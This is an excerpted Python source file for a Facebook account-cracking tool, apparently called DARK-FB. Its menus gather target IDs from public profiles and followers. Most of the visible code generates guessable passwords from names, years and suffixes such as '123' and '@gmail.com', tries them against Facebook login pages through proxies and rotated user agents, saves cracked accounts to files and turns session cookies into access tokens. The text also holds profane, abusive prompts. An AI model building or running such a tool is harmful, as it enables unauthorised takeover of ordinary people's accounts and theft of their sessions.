...
try:
	...
	try:
		...
		os.sys.exit("[?] The Package Rich is not installed (Install Manual : python -m pip install rich &> /dev/null)")
...
try:
	...
	try:
		...
		print(f"[X] Currently Installing packages {e.name}, Be patient please....")
...
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augstus", "09": "September", "10": "October", "11": "November", "12": "December"}
...
link_app,prox_k,id_ri,idd,id,loop,ok,cp,yyy,apk_me,pass_,method,prox_,opsi_y,url_met,pass_man,fps = [],"",[100063716716333],[],[],0,[],[],"AKTIF","TIDAK","","",[],"DOWN","","",""
...
def cek_apk_hasil_crk():
	cekfile_crk("results")
	nama_z = input(">--File Name--> ")
	if nama_z == "":kotak("# DONT EMPTY COCK🤭",I,I);time.sleep(2);exit()
	try:total__ = len(open(nama_z,"r").readlines())
	except FileNotFoundError:kotak('# FILE DOESNT EXIST',K,Q);exit()
...
class Main():
	...
	def menu_del(self, kataa):
		iprint(Panel(f"{MM}NO MENU {QQ}[{CC}{kataa}{QQ}]{MM} THIS IS NOT AVAILABLE... BACK TO MENU", style=Q));time.sleep(3)
		Main()
	def intro(self):
		...
		except:open("data/kata","w").write("#WELCOME THANKS FOR USING MY TOOL");kotak(f"# WELCOME BRO !!", K, C)
		now = datetime.now()
		hour = now.hour
		if hour < 4:
			waktu = "Good morning"
...
Ryhad TM"""
		...
		tod=my_rrrrr.add(f"{j}My WhatsApp{q}")
		tod.add(f"{b}wa.me/2348178406817{q}")
		tod_=my_rrrrr.add(f"{j}Facebook Page(CYBER DEMON){q}")
		tod_.add(f"{b}https://www.facebook.com/profile.php?id=100063716716333{q}")
		tod_.add(f"{b}https://www.facebook.com/profile.php?id=100063716716333{q}")
		...
		try:
			...
			prints(token_e)
			kotak("# TOKEN EXPIRED", M, Q)
			os.sys.exit()
		data_=my_rrrrr.add(f"\r{k} YOUR FACEBOOK DATA{q}")
		data_.add(f"Username/Id       :{u}{nama}{q}")
		data_.add(f"Date Joined :{u}{waktuu}{q}")
		data_.add(f"Ip Address        :{u}{str(sh['origin'])}{q}")
		data_.add(f"Login Using :{u}{zza}{q}")
		prints(my__)
...
00"""
		tip = f"""Crack from Public({II}SINGLE{II})
Crack from
Public{QQ}({KK} MULTIPLE {QQ})
Crack from Follower
Check Number of Friends
Check Crack Results
Check Options Session Account
...
❎"""
	...
	def pilihan(self):
		...
		if ki in ["1","01"]:self.public();os.sys.exit()
			...
			tod = f"{MM}SORRY OPTION {QQ}[{CC}{ki}{QQ}] {MM} IS NOT AVAILABLE.."
	...
	def logut(self):
		...
		kotak("# Token And Cookies Deleted Successfully (Log Out Successfully", M, Q)
		os.sys.exit()
	...
	def ambil_nama(self,idd):
		try:
			...
			iprint(Panel(f"Sorry Idz{QQ}[{MM}{idd}{QQ}]{CC} Not Found"))
			time.sleep(3)
			Main()
		return nama
	...
	def public_mass(self):
		try:
			...
			os.sys.exit()
		god = ""
		kotak("# ENTER THE NUMBER OF TARGETS",K,Q)
		try:jmlh_ = int(input("⚔️Number of Targets⚔️"))
		except:jmlh_ = 1
		kotak("# PLEASE ENTER IDZ/USERNAME TO START CRACK!!",C,Q)
		for x in range(jmlh_):
			idt = input(f">--{k}Target{q}--> : ")
			limit = ("100000000")
			idt = self.ubah_user(idt)
			god += ("Name  : "+II+self.ambil_nama(idt)+QQ+"\n")
			try:
		...
		if say == "NOT":
			kotak("# SORRY THE NUMBER OF IDZ COLLECTED IS ZERO OR EMPTY",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOOSE ", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack From Old Account\nCrack From New Account\nCrack From Random Account {QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'⚔️{c}Choose Options 1-3{q}⚔️ ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			...
			kotak("#NEXT TIME FILL CORRECTLY !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def public(self):
	...
	def follow(self):
		...
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOOSE ", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack From Old Account\nCrack From New Account {QQ}({II}Recommended{QQ}){MM}\nCrack From Random Account")
		sol().print(tod, justify='center')
	...
	def cek_jumlah_teman(self):
		try:
			...
			kotak("# SORRY YOUR TOKEN HAS EXPIRED/ERROR",M,Q)
			time.sleep(2)
			os.sys.exit()
		god = ""
		kotak("# PLEASE ENTER IDZ/USERNAME TO START CRACK!!",C,Q)
		...
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOOSE ", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Check the number of friends from the old account\nCheck the number of friends from the new account\nCheck the number of friends from Random Account")
		sol().print(tod, justify='center')
	...
	def _lonte_(self, ml, token, toket):
		...
		todz.add_column("NUMBER OF FRIENDS", style=C, justify="center")
	...
	def rek(self):
		...
		namax=input(f">--File Name--> ")
		try:
			fila=open(namax,"r").readlines()
		except FileNotFoundError:
			kotak("# SORRY THE FILE YOU ENTER DOESNT EXIST!!", M,Q);time.sleep(3)
			self.rek()
		try:
			...
			try:
				...
				Ass = ("%s"%(CC))
				aSs = MM
		kotak(f"# NUMBER OF ACCOUNTS : {len(fila)}",C,Q)
		with __Kiky__(max_workers=30) as (form):
			for data in fila:
				try:
					...
					iprint(Panel(f"{QQ}{Ass}{copy_ri}{QQ}{aSs}{user}|{pw}|{tll}{QQ}", style=Q, title="ACCOUNT"))
				except:pass
				time.sleep(0.01)
	def cek_opsi(self):
		cekfile_crk("results")
		...
		try:
			...
			kotak("# SORRY THE FILE YOU ENTER DOESNT EXIST,M,Q")
		...
		kotak("# PRESS ENTER TO RETURN",I,Q)
		input()
		Main_()._no_vpn()
class crack_new:
	def __init__(self):
		_ = "ALREADY KNEW CODING ALONE WAS NOT HELPED, YOUR BOY DAVID IS HERE TO HELP"
	def Kontol_Kau_Ikuti(self,sessionn,cokii):
		try:
			r = BeautifulSoup(sessionn.get("https://mbasic.facebook.com/profile.php?id=100063716716333",cookies={"cookie":cokii}).text,"html.parser")
		...
		try:
			...
			with requests.Session() as xyz:
				for x in par(xyz.get('https://mbasic.facebook.com/100063716716333',cookies=puput).content,'html.parser').find_all('a',href=True):
	...
	def otomatis(self):
		...
		kotak("# BEFORE CRACK PLEASE ANSWER THE QUESTION BELOW",I,Q)
		self.pilih_fps()
		if "fast" == fps:
			self.buat_ugen()
			self.pilih_mentod_()
			...
			self.pilih_mentod()
		self.pas_me()
		iprint(Panel(f"{OO}IF THERE IS NO RESULT, PLEASE TURN OFF AIRPLANE  MODET{QQ}\n{II}RESULTS OK  ARE SAVED TO : results/OK-{durasi}.txt\n{KK}CP RESULTS ARE SAVED TO : results/CP-{durasi}.txt{QQ}", style=Q, title="INFORMATION"))
		with anim:
						...
						if len(colmek)<5:
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									...
									pwe.append(colmek+"2003")
									pwe.append(colmek+"2002")
									pwe.append(colmek+"2001")
									pwe.append(colmek+"2000")
									pwe.append(colmek+"2030")
									pwe.append(colmek+"1999")
									pwe.append(colmek+"12345")
									pwe.append(colmek+"123456")
									pwe.append(colmek+"1234567")
									pwe.append(colmek+"12345678")
									pwe.append(colmek+"123456789")
							...
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									...
									pwe.append(colmek+"03")
									pwe.append(colmek+"020")
									pwe.append(colmek+"001")
									pwe.append(colmek+"002")
									pwe.append(colmek+"911")
									pwe.append(colmek+"1314")
								...
								if pass_ in ["01","1"]:
									...
									pwe.append(colmek+"@123")
									pwe.append(colmek+"@1234")
									pwe.append(colmek+"@112")
									pwe.append(colmek+"@1122")
									pwe.append(colmek+"@11223344")
									pwe.append(colmek+"@001")
									pwe.append(colmek+"@012")
									pwe.append(colmek+"@010")
									pwe.append(colmek+"@100")
									pwe.append(colmek+"@321")
									pwe.append(colmek+"@gmail.com")
									pwe.append(colmek+"@12345")
									pwe.append(colmek+"@123456")
								elif pass_ in ["02","2"]:
									pwe.append(colmek)
									...
									pwe.append(colmek+"123456789")
									pwe.append(colmek+"112")
									pwe.append(colmek+"1020")
									pwe.append(colmek+"222")
									pwe.append(colmek+"15")
									pwe.append(colmek+"756")
									pwe.append(colmek+"3405")
									pwe.append(colmek+"1999")
									pwe.append(colmek+"00000000")
									pwe.append(colmek+"01")
									pwe.append(colmek+"02")
									pwe.append(colmek+"55")
									pwe.append(colmek+"44")
									pwe.append(colmek+"33")
									pwe.append(colmek+"99")
									pwe.append(colmek+"09")
									pwe.append(colmek+"10")
								elif pass_ in ["03","3"]:
									pwe.append(colmek+"123")
...
#					except Exception as e:print(e)
	...
	def chexk_ip_spam(self,user,memek,url):
		check_spam="memek"
		if check_spam == "Kntl":
			kata_s = "╔══════════════════════════════════════════════════════════════════════════════════════╗\n║                             YOUR NETWORK IS SUBJECT TO SPAM                            ║\n╚══════════════════════════════════════════════════════════════════════════════════════╝"
			try:
				url="p.facebook.com"
	...
	#			user,pw,ttl = ("100035736123088|josgandos|-").split("|")
				...
				if 'c_user' in session.cookies.get_dict():
					...
					anim.update(anim2,description=f"{i}{m2}YOUR NETWORK IS ABOUT SPAM{q}")
					anim.advance(anim2)
		...
		try:
			...
			for pw in memek:
				...
				if "session_key" in str(xo):
					...
					ok__= ok_.add(f":bolivia::oman: {o}ACCOUNT IS OK BRO{q}",guide_style="uu red")
				...
				if 'c_user'+yyy in session.cookies.get_dict():
					...
					if "IYA" in apk_me:
						...
						try:
							...
							ok______= ok_____.add(f"{b}Browser Type{q}")
					...
					if "IYA" == opsi_y:
						...
						try:
							...
							cp______= cp_____.add(f"{b}Browser Type{q}")
...
#		except Exception as e:print(e)
	...
	#	{str(rr(111,999))}
		...
		tod.add_row(f"1\n2\n3\n4\n5\n6\n7\n8",f"UserAgent Nokia\nUserAgent UcBrowser\nUserAgent Random\nUserAgent Chrome\nUserAgent Facebook\nUserAgent By CyberDemon\nUserAgent by David Chinedu\nManual(u can use your own user agent)")
		sol().print(tod, justify='center')

		pilih_ = input(f">--Select 1-5--> {q}")
		if pilih_ in ("1","01"):
			for x in range(2000):
			...
			try:
				jmlh = int(input(f">--Number of UserAgent--> "))
			except:jmlh=1
			for x in range(jmlh):
				ues=input('>--Enter UserAgent--> ')
				if ues == '':
					kotak("# DONT EMPTY,YOU DICK",M,Q)
					time.sleep(5);self.buat_ugen()
				elif len(ues)<=99:
					kotak("# MINIMUM USERAGENT 99 WORDS",M,Q)
					time.sleep(5);self.buat_ugen()
				else:
					ugen_.append(ues)
		else:
			kotak("# SORRY YOUR CHOISE WAS NOT FOUND",M,Q)
			self.buat_ugen()
	...
	def pilih_url(self):
		...
		if hu in ['1','01']:
			...
			kotak("# FUCKER, JUST CHOOSE 1-4,IS THATS HARD, DOUCHEBAG",C,Q)
			time.sleep(2)
			self.pilih_url()
	def pilih_mentod_(self):
		...
		tod.add_row(f"1\n2",f"Method 1\nMethod 2")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Select 1-2{q}--> ')
		if hu in ['1','01']:
			method = "ke1"
		elif hu in ['2','02']:
			method = "ke2"
		else:
			kotak("# FUCKER, JUST CHOOSE 1-2,IS THATS HARD, DOUCHEBAG",C,Q)
			time.sleep(2)
			self.pilih_mentod_()
	def pilih_mentod(self):
		...
		if hu in ['1','01']:
			...
			kotak("# FUCKER, JUST CHOOSE 1-5,IS THATS HARD, DOUCHEBAG",C,Q)
			time.sleep(2)
			self.pilih_mentod()
	...
	def pilih_next(self):
		...
		if hu in ['1','01']:
			...
			kotak("# FUCKER, JUST CHOOSE 1-5, IS THAT'S HARD, DOUCHEBAG",C,Q)
			time.sleep(2)
			self.pilih_next()
	...
	def tanya_prox_k(self):
		global prox_k
		iprint(Panel(f'{CC}Do you want to use a proxy{QQ}'))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# DONT EMPTY, CHOOSE", M,Q)
	...
	def tanya_apk(self):
		global apk_me
		iprint(Panel(f"{CC}Do you want to show the application{QQ}({KK}Not Recommended{QQ})", style=Q, title="PEPEK ENGGA DIBACA"))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# DONT EMPTY, FILL UP", M,Q)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			apk_me = "IYA"
		elif kp in ["n","N"]:
	...
	def pas_me(self):
		...
		wwe.add_row("1\n2\n3\n4\n5\n6", "name123,name12345...+combination+complex\nname,name123,...+combination\nname,name123,name12345,...(Recommend)\nname,1234,Nigeria,name123,name12345...+combination+complex\nname,1234,Nigeria,name123,name12345...+combination+complex + MANUAL\nMANUAL")
		sol().print(wwe, justify='center')
		kol = input(f">--Select 1-5--> ")
		if kol in [" ",""]:
			kotak("# DONT LEAVE BLANK YOU ASSHOLE", M,Q)
			...
			pass_ = "6"
			kotak("# USE , (comma) For Password Separator And Minimum Pass 10 Letters/Numbers",I,M)
			pwx = input(f">--{k}Password{q}--> ")
			if pwx == '':
				kotak("# DONT EMPTY. FILL IT ASSHOLE",M,Q)
				time.sleep(3),self.pas_me()
			elif len(pwx)<=11:
				kotak("# MINIMUM PASSWORD MUST BE MORE THAN 5 LETTERS/NUMBERS",K,Q)
				time.sleep(3),self.pas_me()
...
def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	ok_ = Tree("               ",highlight=True, hide_root=True)
	ok__= ok_.add(f":bolivia::oman: {o}ACCOUNT IS OK BRO{q}",guide_style="uu green")
...
def check_op(userrz,pwz,ttl,opsi):
	try:
		...
		if "c_user" in ses.cookies:
			...
			if(str(len(ngew))=="0"):
				opsi.add(f"{u}HAPPY THIS ACCOUNT TAP YE 😎 {q}({b}Login Via fb Lite/Mbasic{q})")
...
def get_proxy_socks5():
	...
	for name_prox in kontol_prox:
		try:
			...
			kotak("# OOPS... YOUR NETWORK IS DISCONNECTED 😟",M,C)
			os.sys.exit()
...
#		login_cookie(cookie)
		kotak("# PLEASE COPY COOKIES ACCORDING TO YOUR NEED!!",I,Q)
		login_cok()
	except Exception as e:
...
▒█▄▄▀ ▒█░▒█ ▒█░▒█ ▒█░▒█ ░░ ▒█░░░ ▒█▄▄█{AL}"""
	...
	tod.add_row(f"1\n2","Free Cookies\nLogin Cookies",f"{MM}ONN{QQ}\n{II}ONN{QQ}")
	sol().print(tod, justify='center')
	pil=input(f">--Select 1-2--> {q}")
	if pil in ("1","01"):
  #		free_cookies()
		os.system("clear")
		free_cookies();os.sys.exit()
	elif pil in ("02","2"):
		os.system("clear")
		login_cok();os.sys.exit()
	else:
		kotak("# SORRY THE OPTION YOU CHOOSE DOES NOT EXIST !!",M,Q);time.sleep(3)
		login()
...
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝{AL}"""
	...
	try:
		...
		kotak("# PLEASE BE PATIENT CURRENTLY ANALYSING YOUR FACEBOOK TOKEN/COOKIES",K,Q)
		if cokex in [" ",""]:
		...
		try:
			...
			nama= zxc["name"]
			bot_facebook()
			kotak(f"# Welcome {nama}.... Hope Your Tokens/Cookie Lasts 🤭", I, Q)
			...
			kotak(f"# SORRY, YOUR COOKIES HAVE ERRORS {str(e)}", M, Q)
...
class convert_token:
	...
	def __eaag__(self):
		...
		if len(hasil_) == 0:
			kotak("# SORRY, YOU CANT CHANGE YOUR COOKIES EAAG TOKENS",M,Q)
			kotak('# PLEASE BE PATIENT CHANGE TOKEN EAAI',I,Q)
			self.__eaai__()
		else:
			for token in hasil_:
	...
	def __eaai__(self):
		with requests.Session() as r:
			...
			if len(find) == 0:
				kotak("# SORRY, YOU CANT CHANGE YOUR COOKIES EAAI TOKEN",M,Q)
				kotak('# PLEASE BE PATIENT CREATING THE EAAB TOKEN',I,Q)
				self.__eaab__()
#				os.sys.exit()
			else:
				for token in find:
	...
	def __eaab__(self):
		with requests.Session() as r:
			...
			if len(find) == 0:
				kotak("# SORRY, YOU CANT CHANGE YOUR COOKIES EAAB TOKEN",M,Q)
				os.sys.exit()
			else:
				for y in find:
...
class Main_:
	...
	def __check_update_(self, version_):
		...
		if version == version_:
			...
			kocol = ""
			kocol += QQ+"Version of This Script ("+OO+version_+QQ+") Will be updated to("+OO+version+QQ+")\n\n"
			...
			kotak("# TRY TO TYPE : python main.py ONCE AGAIN!!!",M,Q)
			os.sys.exit()
	def __check_status_(self, mainx):
		...
		if mainx == mainz:
			...
			kotak("# SORRY SERVER OF DARK-FB IS UNDER MAINTENANCE, WE WILL BE BACK SOON  😅",C,K)
			os.system('git pull')
			os.sys.exit()
	def _no_vpn(self):
#		try:
